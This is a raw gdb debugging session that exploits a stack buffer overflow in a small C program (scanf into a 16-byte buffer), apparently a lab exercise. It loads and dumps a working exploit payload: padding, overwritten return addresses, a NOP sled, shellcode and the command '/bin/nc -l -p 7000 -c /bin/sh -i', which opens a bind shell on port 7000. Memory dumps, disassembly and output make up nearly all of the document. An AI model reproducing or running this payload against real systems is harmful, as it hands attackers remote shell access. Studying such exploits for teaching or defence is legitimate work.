(gdb) x /100wx 0xBFFFEF48
0xbfffef48:     0x4f414943      0x00000000      0x00000000      0x00000000
0xbfffef58:     0x00000013      0xb7fc4400      0xb7da76ac      0xb7fdbd41
0xbfffef68:     0xb7da29a2      0xb7fa3ff4      0x00403ee8      0xb7ffeba0
0xbfffef78:     0xbfffef88      0x004015ac      0x00000001      0x00000000
0xbfffef88:     0x00000000      0xb7da97c5      0x00000001      0xbffff044
0xbfffef98:     0xbffff04c      0xbfffefb0      0xb7fa3ff4      0x00401597
0xbfffefa8:     0x00000001      0xbffff044      0xb7fa3ff4      0x00403ee8
0xbfffefb8:     0xb7ffeba0      0x00000000      0xd8b1e304      0x9241c914
0xbfffefc8:     0x00000000      0x00000000      0x00000000      0xb7ffeba0
0xbfffefd8:     0x00000000      0x2d4f2200      0xb7fffa30      0xb7da9756
0xbfffefe8:     0xb7fa3ff4      0xb7da9888      0xb7fccac4      0x00403ee8
0xbfffeff8:     0x00000000      0xb7fff000      0x00000000      0xb7fddd60
0xbffff008:     0xb7da9809      0x00403ff4      0x00000001      0x004010a0
0xbffff018:     0x00000000      0x004010c7      0x00401597      0x00000001
0xbffff028:     0xbffff044      0x00000000      0x00000000      0xb7fd0d50
0xbffff038:     0xbffff03c      0xb7fffa30      0x00000001      0xbffff215
0xbffff048:     0x00000000      0xbffff24a      0xbffff259      0xbffff26d
0xbffff058:     0xbffff290      0xbffff2c6      0xbffff2e7      0xbffff2f4
0xbffff068:     0xbffff312      0xbffff32e      0xbffff34a      0xbffff35a
0xbffff078:     0xbffff36b      0xbffff375      0xbffff382      0xbffff3a1
0xbffff088:     0xbffff3ff      0xbffff41d      0xbffff438      0xbffff46a
0xbffff098:     0xbffff47d      0xbffff49b      0xbffff4b6      0xbffff504
0xbffff0a8:     0xbffff517      0xbffff52a      0xbffff559      0xbffff56d
0xbffff0b8:     0xbffff577      0xbffff582      0xbffff5a4      0xbffff5bd
0xbffff0c8:     0xbffff5d6      0xbffff61e      0xbffff64e      0xbffff664
(gdb) info registers
eax            0x1                 1
ecx            0x0                 0
edx            0xb7fc54c0          -1208200000
ebx            0x403ff4            4210676
esp            0xbfffeec0          0xbfffeec0
ebp            0xbfffef78          0xbfffef78
esi            0x403ee8            4210408
edi            0xb7ffeba0          -1207964768
eip            0x401236            0x401236 <f+109>
eflags         0x286               [ PF SF IF ]
cs             0x73                115
ss             0x7b                123
ds             0x7b                123
es             0x7b                123
fs             0x0                 0
gs             0x33                51
(gdb) restore ./exploit binary 0xbfffef48
Restoring binary file ./exploit into memory (0xbfffef48 to 0xbffff3dd)
(gdb) x /100wx 0xBFFFEF48
0xbfffef48:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffef58:     0xbffff000      0xbffff000      0xbffff000      0xbffff000
0xbfffef68:     0xbffff000      0xbffff000      0xbffff000      0xbffff000
0xbfffef78:     0xbffff000      0xbffff000      0xbffff000      0x6e69622f
0xbfffef88:     0x00636e2f      0x2d006c2d      0x30370070      0x2d003030
0xbfffef98:     0x622f0063      0x732f6e69      0x692d2168      0x00000000
0xbfffefa8:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffefb8:     0x00000000      0x00000000      0x706f6e00      0x90903e73
0xbfffefc8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffefd8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffefe8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffeff8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff008:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff018:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff028:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff038:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff048:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff058:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff068:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff078:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff088:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff098:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff0a8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff0b8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff0c8:     0x90909090      0x90909090      0x90909090      0x90909090
(gdb) x
0xbffff0d8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff0e8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff0f8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff108:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff118:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff128:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff138:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff148:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff158:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff168:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff178:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff188:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff198:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff1a8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff1b8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff1c8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff1d8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff1e8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff1f8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff208:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff218:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff228:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff238:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff248:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff258:     0x90909090      0x90909090      0x90909090      0x90909090
(gdb) x
0xbffff268:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff278:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff288:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff298:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff2a8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff2b8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff2c8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff2d8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff2e8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff2f8:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff308:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff318:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff328:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff338:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff348:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff358:     0x90909090      0x90909090      0x0000e890      0x8d5d0000
0xbffff368:     0xfffc1e9d      0x3f8d8dff      0x8dfffffc      0xfffc1e85
0xbffff378:     0x3f8589ff      0x8dfffffc      0xfffc2685      0x438589ff
0xbffff388:     0x8dfffffc      0xfffc2985      0x478589ff      0x8dfffffc
0xbffff398:     0xfffc2c85      0x4b8589ff      0x8dfffffc      0xfffc3185
0xbffff3a8:     0x4f8589ff      0x8dfffffc      0xfffc3485      0x538589ff
0xbffff3b8:     0xfefffffc      0xfffc3b8d      0x57958dff      0x31fffffc
0xbffff3c8:     0x0005c7c0      0x6f000000      0x83000000      0x0000002d
0xbffff3d8:     0x80cd6400      0x622f3a0a      0x2f3a6e69      0x2f727375
0xbffff3e8:     0x61636f6c      0x61672f6c      0x3a73656d      0x7273752f
(gdb) info registers
eax            0x1                 1
ecx            0x0                 0
edx            0xb7fc54c0          -1208200000
ebx            0x403ff4            4210676
esp            0xbfffeec0          0xbfffeec0
ebp            0xbfffef78          0xbfffef78
esi            0x403ee8            4210408
edi            0xb7ffeba0          -1207964768
eip            0x401236            0x401236 <f+109>
eflags         0x286               [ PF SF IF ]
cs             0x73                115
ss             0x7b                123
ds             0x7b                123
es             0x7b                123
fs             0x0                 0
gs             0x33                51
(gdb) l 0
1       #include <stdio.h>
2
3       void f()
4       {
5         char buffer[16];
6         int i, l;
7         printf("%x\n", (unsigned int)buffer);
8         printf("input %X> ", buffer);
9           /*svuota il buffer*/
10        fflush(stdout); 
(gdb) l
11        scanf("%s", buffer);
12        
13        l = 1173;
14        
15        printf("\n%d bytes read\n", l);
16        i = 0;
17        while (i<l)
18        {
19              printf("%8X: %.2X %.2X %.2X %.2X %.2X %.2X %.2X %.2X - %.2X %.2X %.2X %.2X %.2X %.2X %.2X %.2X %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n",                                                                                 
20                      &buffer[i], (unsigned char)buffer[i], (unsigned char)buffer[i+1], (unsigned char)buffer[i+2], (unsigned char)buffer[i+3], (unsigned char)buffer[i+4], (unsigned char)buffer[i+5], (unsigned char)buffer[i+6], (unsigned char)buffer[i+7], (unsigned char)buffer[i+8],                                                         
(gdb) l
21                      (unsigned char)buffer[i+9],  (unsigned char)buffer[i+10], (unsigned char)buffer[i+11], (unsigned char)buffer[i+12], (unsigned char)buffer[i+13], (unsigned char)buffer[i+14], (unsigned char)buffer[i+15],  
22                      (unsigned char)buffer[i], (unsigned char)buffer[i+1], (unsigned char)buffer[i+2], (unsigned char)buffer[i+3], (unsigned char)buffer[i+4], (unsigned char)buffer[i+5], (unsigned char)buffer[i+6], (unsigned char)buffer[i+7], (unsigned char)buffer[i+8],                                                                     
23                      (unsigned char)buffer[i+9],  (unsigned char)buffer[i+10], (unsigned char)buffer[i+11], (unsigned char)buffer[i+12], (unsigned char)buffer[i+13], (unsigned char)buffer[i+14], (unsigned char)buffer[i+15]); 
24              i+=16;
25        }
26        i=0;
27        while ( buffer[i]>=' ' )
28        {
29          fputc(buffer[i]+1, stdout);
30          i++;
(gdb) l
31        }
32        printf("\n");
33      }
34
35      int main(int argc, char** argv) 
36      {
37        f();
38      }
(gdb) l
Line number 39 out of range; target.c has 38 lines.
(gdb) step
15        printf("\n%d bytes read\n", l);
(gdb) disassemble 0x401236
Dump of assembler code for function f:
   0x004011c9 <+0>:     push   %ebp
   0x004011ca <+1>:     mov    %esp,%ebp
   0x004011cc <+3>:     push   %edi
   0x004011cd <+4>:     push   %esi
   0x004011ce <+5>:     push   %ebx
   0x004011cf <+6>:     sub    $0xac,%esp
   0x004011d5 <+12>:    call   0x4010d0 <__x86.get_pc_thunk.bx>
   0x004011da <+17>:    add    $0x2e1a,%ebx
   0x004011e0 <+23>:    lea    -0x30(%ebp),%eax
   0x004011e3 <+26>:    sub    $0x8,%esp
   0x004011e6 <+29>:    push   %eax
   0x004011e7 <+30>:    lea    -0x1fec(%ebx),%eax
   0x004011ed <+36>:    push   %eax
   0x004011ee <+37>:    call   0x401040 <printf@plt>
   0x004011f3 <+42>:    add    $0x10,%esp
   0x004011f6 <+45>:    sub    $0x8,%esp
   0x004011f9 <+48>:    lea    -0x30(%ebp),%eax
   0x004011fc <+51>:    push   %eax
   0x004011fd <+52>:    lea    -0x1fe8(%ebx),%eax
   0x00401203 <+58>:    push   %eax
   0x00401204 <+59>:    call   0x401040 <printf@plt>
   0x00401209 <+64>:    add    $0x10,%esp
   0x0040120c <+67>:    mov    -0xc(%ebx),%eax
   0x00401212 <+73>:    mov    (%eax),%eax
   0x00401214 <+75>:    sub    $0xc,%esp
   0x00401217 <+78>:    push   %eax
   0x00401218 <+79>:    call   0x401050 <fflush@plt>
   0x0040121d <+84>:    add    $0x10,%esp
   0x00401220 <+87>:    sub    $0x8,%esp
   0x00401223 <+90>:    lea    -0x30(%ebp),%eax
   0x00401226 <+93>:    push   %eax
   0x00401227 <+94>:    lea    -0x1fdd(%ebx),%eax
--Type <RET> for more, q to quit, c to continue without paging--
   0x0040122d <+100>:   push   %eax
   0x0040122e <+101>:   call   0x401080 <__isoc99_scanf@plt>
   0x00401233 <+106>:   add    $0x10,%esp
   0x00401236 <+109>:   movl   $0x495,-0x20(%ebp)
   0x0040123d <+116>:   sub    $0x8,%esp
   0x00401240 <+119>:   push   -0x20(%ebp)
   0x00401243 <+122>:   lea    -0x1fda(%ebx),%eax
   0x00401249 <+128>:   push   %eax
   0x0040124a <+129>:   call   0x401040 <printf@plt>
   0x0040124f <+134>:   add    $0x10,%esp
   0x00401252 <+137>:   movl   $0x0,-0x1c(%ebp)
   0x00401259 <+144>:   jmp    0x401533 <f+874>
   0x0040125e <+149>:   mov    -0x1c(%ebp),%eax
   0x00401261 <+152>:   add    $0xf,%eax
   0x00401264 <+155>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x00401269 <+160>:   movzbl %al,%eax
   0x0040126c <+163>:   mov    %eax,-0x3c(%ebp)
   0x0040126f <+166>:   mov    -0x1c(%ebp),%eax
   0x00401272 <+169>:   add    $0xe,%eax
   0x00401275 <+172>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x0040127a <+177>:   movzbl %al,%esi
   0x0040127d <+180>:   mov    %esi,-0x40(%ebp)
   0x00401280 <+183>:   mov    -0x1c(%ebp),%eax
   0x00401283 <+186>:   add    $0xd,%eax
   0x00401286 <+189>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x0040128b <+194>:   movzbl %al,%edi
   0x0040128e <+197>:   mov    %edi,-0x44(%ebp)
   0x00401291 <+200>:   mov    -0x1c(%ebp),%eax
   0x00401294 <+203>:   add    $0xc,%eax
   0x00401297 <+206>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x0040129c <+211>:   movzbl %al,%ecx
   0x0040129f <+214>:   mov    %ecx,-0x48(%ebp)
   0x004012a2 <+217>:   mov    -0x1c(%ebp),%eax
--Type <RET> for more, q to quit, c to continue without paging--
   0x004012a5 <+220>:   add    $0xb,%eax
   0x004012a8 <+223>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x004012ad <+228>:   movzbl %al,%edx
   0x004012b0 <+231>:   mov    %edx,-0x4c(%ebp)
   0x004012b3 <+234>:   mov    -0x1c(%ebp),%eax
   0x004012b6 <+237>:   add    $0xa,%eax
   0x004012b9 <+240>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x004012be <+245>:   movzbl %al,%eax
   0x004012c1 <+248>:   mov    %eax,-0x50(%ebp)
   0x004012c4 <+251>:   mov    -0x1c(%ebp),%eax
   0x004012c7 <+254>:   add    $0x9,%eax
   0x004012ca <+257>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x004012cf <+262>:   movzbl %al,%esi
   0x004012d2 <+265>:   mov    %esi,-0x54(%ebp)
   0x004012d5 <+268>:   mov    -0x1c(%ebp),%eax
   0x004012d8 <+271>:   add    $0x8,%eax
   0x004012db <+274>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x004012e0 <+279>:   movzbl %al,%edi
   0x004012e3 <+282>:   mov    %edi,-0x58(%ebp)
   0x004012e6 <+285>:   mov    -0x1c(%ebp),%eax
   0x004012e9 <+288>:   add    $0x7,%eax
   0x004012ec <+291>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x004012f1 <+296>:   movzbl %al,%ecx
   0x004012f4 <+299>:   mov    %ecx,-0x5c(%ebp)
   0x004012f7 <+302>:   mov    -0x1c(%ebp),%eax
   0x004012fa <+305>:   add    $0x6,%eax
   0x004012fd <+308>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x00401302 <+313>:   movzbl %al,%edx
   0x00401305 <+316>:   mov    %edx,-0x60(%ebp)
   0x00401308 <+319>:   mov    -0x1c(%ebp),%eax
   0x0040130b <+322>:   add    $0x5,%eax
   0x0040130e <+325>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x00401313 <+330>:   movzbl %al,%eax
--Type <RET> for more, q to quit, c to continue without paging--
   0x00401316 <+333>:   mov    %eax,-0x64(%ebp)
   0x00401319 <+336>:   mov    -0x1c(%ebp),%eax
   0x0040131c <+339>:   add    $0x4,%eax
   0x0040131f <+342>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x00401324 <+347>:   movzbl %al,%esi
   0x00401327 <+350>:   mov    %esi,-0x68(%ebp)
   0x0040132a <+353>:   mov    -0x1c(%ebp),%eax
   0x0040132d <+356>:   add    $0x3,%eax
   0x00401330 <+359>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x00401335 <+364>:   movzbl %al,%edi
   0x00401338 <+367>:   mov    %edi,-0x6c(%ebp)
   0x0040133b <+370>:   mov    -0x1c(%ebp),%eax
   0x0040133e <+373>:   add    $0x2,%eax
   0x00401341 <+376>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x00401346 <+381>:   movzbl %al,%ecx
   0x00401349 <+384>:   mov    %ecx,-0x70(%ebp)
   0x0040134c <+387>:   mov    -0x1c(%ebp),%eax
   0x0040134f <+390>:   add    $0x1,%eax
   0x00401352 <+393>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x00401357 <+398>:   movzbl %al,%edx
   0x0040135a <+401>:   mov    %edx,-0x74(%ebp)
   0x0040135d <+404>:   lea    -0x30(%ebp),%edx
   0x00401360 <+407>:   mov    -0x1c(%ebp),%eax
   0x00401363 <+410>:   add    %edx,%eax
   0x00401365 <+412>:   movzbl (%eax),%eax
   0x00401368 <+415>:   movzbl %al,%eax
   0x0040136b <+418>:   mov    %eax,-0x78(%ebp)
   0x0040136e <+421>:   mov    -0x1c(%ebp),%eax
   0x00401371 <+424>:   add    $0xf,%eax
   0x00401374 <+427>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x00401379 <+432>:   movzbl %al,%esi
   0x0040137c <+435>:   mov    %esi,-0x7c(%ebp)
   0x0040137f <+438>:   mov    -0x1c(%ebp),%eax
--Type <RET> for more, q to quit, c to continue without paging--
   0x00401382 <+441>:   add    $0xe,%eax
   0x00401385 <+444>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x0040138a <+449>:   movzbl %al,%edi
   0x0040138d <+452>:   mov    %edi,-0x80(%ebp)
   0x00401390 <+455>:   mov    -0x1c(%ebp),%eax
   0x00401393 <+458>:   add    $0xd,%eax
   0x00401396 <+461>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x0040139b <+466>:   movzbl %al,%ecx
   0x0040139e <+469>:   mov    %ecx,-0x84(%ebp)
   0x004013a4 <+475>:   mov    -0x1c(%ebp),%eax
   0x004013a7 <+478>:   add    $0xc,%eax
   0x004013aa <+481>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x004013af <+486>:   movzbl %al,%edx
   0x004013b2 <+489>:   mov    %edx,-0x88(%ebp)
   0x004013b8 <+495>:   mov    -0x1c(%ebp),%eax
   0x004013bb <+498>:   add    $0xb,%eax
   0x004013be <+501>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x004013c3 <+506>:   movzbl %al,%eax
   0x004013c6 <+509>:   mov    %eax,-0x8c(%ebp)
   0x004013cc <+515>:   mov    -0x1c(%ebp),%eax
   0x004013cf <+518>:   add    $0xa,%eax
   0x004013d2 <+521>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x004013d7 <+526>:   movzbl %al,%esi
   0x004013da <+529>:   mov    %esi,-0x90(%ebp)
   0x004013e0 <+535>:   mov    -0x1c(%ebp),%eax
   0x004013e3 <+538>:   add    $0x9,%eax
   0x004013e6 <+541>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x004013eb <+546>:   movzbl %al,%edi
   0x004013ee <+549>:   mov    %edi,-0x94(%ebp)
   0x004013f4 <+555>:   mov    -0x1c(%ebp),%eax
   0x004013f7 <+558>:   add    $0x8,%eax
   0x004013fa <+561>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x004013ff <+566>:   movzbl %al,%ecx
--Type <RET> for more, q to quit, c to continue without paging--
   0x00401402 <+569>:   mov    %ecx,-0x98(%ebp)
   0x00401408 <+575>:   mov    -0x1c(%ebp),%eax
   0x0040140b <+578>:   add    $0x7,%eax
   0x0040140e <+581>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x00401413 <+586>:   movzbl %al,%edx
   0x00401416 <+589>:   mov    %edx,-0x9c(%ebp)
   0x0040141c <+595>:   mov    -0x1c(%ebp),%eax
   0x0040141f <+598>:   add    $0x6,%eax
   0x00401422 <+601>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x00401427 <+606>:   movzbl %al,%eax
   0x0040142a <+609>:   mov    %eax,-0xa0(%ebp)
   0x00401430 <+615>:   mov    -0x1c(%ebp),%eax
   0x00401433 <+618>:   add    $0x5,%eax
   0x00401436 <+621>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x0040143b <+626>:   movzbl %al,%esi
   0x0040143e <+629>:   mov    %esi,-0xa4(%ebp)
   0x00401444 <+635>:   mov    -0x1c(%ebp),%eax
   0x00401447 <+638>:   add    $0x4,%eax
   0x0040144a <+641>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x0040144f <+646>:   movzbl %al,%edi
   0x00401452 <+649>:   mov    %edi,-0xa8(%ebp)
   0x00401458 <+655>:   mov    -0x1c(%ebp),%eax
   0x0040145b <+658>:   add    $0x3,%eax
   0x0040145e <+661>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x00401463 <+666>:   movzbl %al,%ecx
   0x00401466 <+669>:   mov    %ecx,-0xac(%ebp)
   0x0040146c <+675>:   mov    -0x1c(%ebp),%eax
   0x0040146f <+678>:   add    $0x2,%eax
   0x00401472 <+681>:   movzbl -0x30(%ebp,%eax,1),%eax
   0x00401477 <+686>:   movzbl %al,%edi
   0x0040147a <+689>:   mov    -0x1c(%ebp),%eax
   0x0040147d <+692>:   add    $0x1,%eax
   0x00401480 <+695>:   movzbl -0x30(%ebp,%eax,1),%eax
--Type <RET> for more, q to quit, c to continue without paging--
   0x00401485 <+700>:   movzbl %al,%esi
   0x00401488 <+703>:   lea    -0x30(%ebp),%edx
   0x0040148b <+706>:   mov    -0x1c(%ebp),%eax
   0x0040148e <+709>:   add    %edx,%eax
   0x00401490 <+711>:   movzbl (%eax),%eax
   0x00401493 <+714>:   movzbl %al,%ecx
   0x00401496 <+717>:   lea    -0x30(%ebp),%edx
   0x00401499 <+720>:   mov    -0x1c(%ebp),%eax
   0x0040149c <+723>:   add    %edx,%eax
   0x0040149e <+725>:   sub    $0x8,%esp
   0x004014a1 <+728>:   push   -0x3c(%ebp)
   0x004014a4 <+731>:   push   -0x40(%ebp)
   0x004014a7 <+734>:   push   -0x44(%ebp)
   0x004014aa <+737>:   push   -0x48(%ebp)
   0x004014ad <+740>:   push   -0x4c(%ebp)
   0x004014b0 <+743>:   push   -0x50(%ebp)
   0x004014b3 <+746>:   push   -0x54(%ebp)
   0x004014b6 <+749>:   push   -0x58(%ebp)
   0x004014b9 <+752>:   push   -0x5c(%ebp)
   0x004014bc <+755>:   push   -0x60(%ebp)
   0x004014bf <+758>:   push   -0x64(%ebp)
   0x004014c2 <+761>:   push   -0x68(%ebp)
   0x004014c5 <+764>:   push   -0x6c(%ebp)
   0x004014c8 <+767>:   push   -0x70(%ebp)
   0x004014cb <+770>:   push   -0x74(%ebp)
   0x004014ce <+773>:   push   -0x78(%ebp)
   0x004014d1 <+776>:   push   -0x7c(%ebp)
   0x004014d4 <+779>:   push   -0x80(%ebp)
   0x004014d7 <+782>:   push   -0x84(%ebp)
   0x004014dd <+788>:   push   -0x88(%ebp)
   0x004014e3 <+794>:   push   -0x8c(%ebp)
   0x004014e9 <+800>:   push   -0x90(%ebp)
   0x004014ef <+806>:   push   -0x94(%ebp)
--Type <RET> for more, q to quit, c to continue without paging--
   0x004014f5 <+812>:   push   -0x98(%ebp)
   0x004014fb <+818>:   push   -0x9c(%ebp)
   0x00401501 <+824>:   push   -0xa0(%ebp)
   0x00401507 <+830>:   push   -0xa4(%ebp)
   0x0040150d <+836>:   push   -0xa8(%ebp)
   0x00401513 <+842>:   push   -0xac(%ebp)
   0x00401519 <+848>:   push   %edi
   0x0040151a <+849>:   push   %esi
   0x0040151b <+850>:   push   %ecx
   0x0040151c <+851>:   push   %eax
   0x0040151d <+852>:   lea    -0x1fc8(%ebx),%eax
   0x00401523 <+858>:   push   %eax
   0x00401524 <+859>:   call   0x401040 <printf@plt>
   0x00401529 <+864>:   add    $0x90,%esp
   0x0040152f <+870>:   addl   $0x10,-0x1c(%ebp)
   0x00401533 <+874>:   mov    -0x1c(%ebp),%eax
   0x00401536 <+877>:   cmp    -0x20(%ebp),%eax
   0x00401539 <+880>:   jl     0x40125e <f+149>
   0x0040153f <+886>:   movl   $0x0,-0x1c(%ebp)
   0x00401546 <+893>:   jmp    0x401572 <f+937>
   0x00401548 <+895>:   mov    -0xc(%ebx),%eax
   0x0040154e <+901>:   mov    (%eax),%eax
   0x00401550 <+903>:   lea    -0x30(%ebp),%ecx
   0x00401553 <+906>:   mov    -0x1c(%ebp),%edx
   0x00401556 <+909>:   add    %ecx,%edx
   0x00401558 <+911>:   movzbl (%edx),%edx
   0x0040155b <+914>:   movsbl %dl,%edx
   0x0040155e <+917>:   add    $0x1,%edx
   0x00401561 <+920>:   sub    $0x8,%esp
   0x00401564 <+923>:   push   %eax
   0x00401565 <+924>:   push   %edx
   0x00401566 <+925>:   call   0x401070 <fputc@plt>
   0x0040156b <+930>:   add    $0x10,%esp
--Type <RET> for more, q to quit, c to continue without paging--
   0x0040156e <+933>:   addl   $0x1,-0x1c(%ebp)
   0x00401572 <+937>:   lea    -0x30(%ebp),%edx
   0x00401575 <+940>:   mov    -0x1c(%ebp),%eax
   0x00401578 <+943>:   add    %edx,%eax
   0x0040157a <+945>:   movzbl (%eax),%eax
   0x0040157d <+948>:   cmp    $0x1f,%al
   0x0040157f <+950>:   jg     0x401548 <f+895>
   0x00401581 <+952>:   sub    $0xc,%esp
   0x00401584 <+955>:   push   $0xa
   0x00401586 <+957>:   call   0x401060 <putchar@plt>
   0x0040158b <+962>:   add    $0x10,%esp
   0x0040158e <+965>:   nop
   0x0040158f <+966>:   lea    -0xc(%ebp),%esp
   0x00401592 <+969>:   pop    %ebx
   0x00401593 <+970>:   pop    %esi
   0x00401594 <+971>:   pop    %edi
   0x00401595 <+972>:   pop    %ebp
   0x00401596 <+973>:   ret
End of assembler dump.
(gdb) b 0x40158e
Function "0x40158e" not defined.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) b *0x40158e
Breakpoint 2 at 0x40158e: file target.c, line 33.
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) n
Program not restarted.
(gdb) c
Continuing.

1173 bytes read
BFFFEF48: 41 41 41 41 41 41 41 41 - 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
BFFFEF58: 95 04 00 00 10 00 00 00 - 00 F0 FF BF 00 F0 FF BF ???????
BFFFEF68: 00 F0 FF BF 00 F0 FF BF - 00 F0 FF BF 00 F0 FF BF ????????????
BFFFEF78: 00 F0 FF BF 00 F0 FF BF - 00 F0 FF BF 2F 62 69 6E ?????????/bin
BFFFEF88: 2F 6E 63 00 2D 6C 00 2D - 70 00 37 30 30 30 00 2D /nc-l-p7000-
BFFFEF98: 63 00 2F 62 69 6E 2F 73 - 68 21 2D 69 00 00 00 00 c/bin/sh!-i
BFFFEFA8: 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 
BFFFEFB8: 00 00 00 00 00 00 00 00 - 00 6E 6F 70 73 3E 90 90 nops>??
BFFFEFC8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFEFD8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFEFE8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFEFF8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF008: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF018: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF028: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF038: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF048: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF058: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF068: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF078: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF088: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF098: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF0A8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF0B8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF0C8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF0D8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF0E8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF0F8: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF108: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF118: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
BFFFF128: 90 90 90 90 90 90 90 90 - 90 90 90 90 90 90 90 90 ????????????????
